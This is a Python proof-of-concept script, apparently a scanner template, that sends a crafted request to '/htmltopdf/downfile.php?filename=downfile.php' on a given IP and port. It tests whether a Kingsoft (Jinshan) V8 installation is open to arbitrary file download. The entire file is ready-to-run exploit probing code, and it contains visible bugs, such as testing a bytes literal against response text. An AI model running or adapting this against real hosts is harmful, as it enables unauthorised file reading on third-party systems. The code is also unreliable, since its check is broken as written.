#encoding:utf-8
try:
    import requests,os,logging,sys
    logging.basicConfig(level=logging.INFO,format="%(message)s")
except Exception as e:
    logging.info("[*]".format(e))
    os._exit(6)

def check(ip,port):
    
    payload = "/htmltopdf/downfile.php?filename=downfile.php"                                                      #填写payload
    try:
        tar = "http://" + ip + ":" + port
        req = requests.get(tar + payload,timeout=3)
        if req.status_code == 200:                                                          #修改匹配返回代码
            if  b"filename" in req.text :          #填写匹配信息
                logging.info("[+] {} find Jinshan_V8".format(ip))                                 #填写漏洞信息
                os._exit(1)

            else :
                logging.info("[-] {} do not found Jinshan_V8".format(ip))                         #填写漏洞信息
                os._exit(2)

        else :
            logging.info("[-] {} do not found Jinshan_V8".format(ip))                             #填写漏洞信息
            os._exit(2)
    except Exception as e:
        logging.info("[*] {}".format(e))
        os._exit(4)

if __name__ == "__main__":
    ip = sys.argv[1]
    port = sys.argv[2]
    check(ip,port)
